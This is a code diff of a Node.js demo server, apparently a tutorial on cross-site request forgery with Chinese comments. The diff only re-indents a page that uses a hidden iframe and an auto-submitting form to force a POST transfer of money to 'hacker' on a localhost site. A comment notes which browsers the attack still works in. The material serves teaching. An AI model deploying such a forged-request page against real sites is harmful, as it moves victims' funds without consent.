@@ -41,25 +41,25 @@ const routes = {
   '127.0.0.1:4000': (req, res) => {
     // 请使用 Firefox 或 Safari 测试（新版 Chrome 浏览器 cookie samesite 默认值为 Lax，所以 POST 攻击方式不可行，除非源站设置 SameSite=None; Secure;
     res.end(`
-<h2>看起来像正规网站，你永远不知道背后发生了什么！</h2>
-<iframe name="hideIframe" style="display: none"></iframe>
-<form
-  id="form" target="hideIframe" method="POST"
-  enctype="application/x-www-form-urlencoded"
-  action="http://localhost:3000/transfer"
-  style="display: none"
->
-  <input type="text" name="to" value="hacker" />
-  <input type="number" name="money" value="100" />
-</form>
-<script>form.submit()</script>`)
+      <h2>看起来像正规网站，你永远不知道背后发生了什么！</h2>
+      <iframe name="hideIframe" style="display: none"></iframe>
+      <form
+        id="form" target="hideIframe" method="POST"
+        enctype="application/x-www-form-urlencoded"
+        action="http://localhost:3000/transfer"
+        style="display: none"
+      >
+        <input type="text" name="to" value="hacker" />
+        <input type="number" name="money" value="100" />
+      </form>
+      <script>form.submit()</script>`)
   },
 }
 
 function onRequest(req, res) {
   const { url, headers } = req // 获取 url 和 headers
   const cookies = qs.parse(headers.cookie, '; ') // 从 headers 中解析出 cookies 对象
-  
+
   const { query, pathname } = URL.parse(url, true) // 从 url 中解析出 query 和 path 对象
   Object.assign(req, { query, path: pathname, cookies }) // 扩展 req
   const route = routes[headers.host] // 根据 host 分发路由（策略模式）
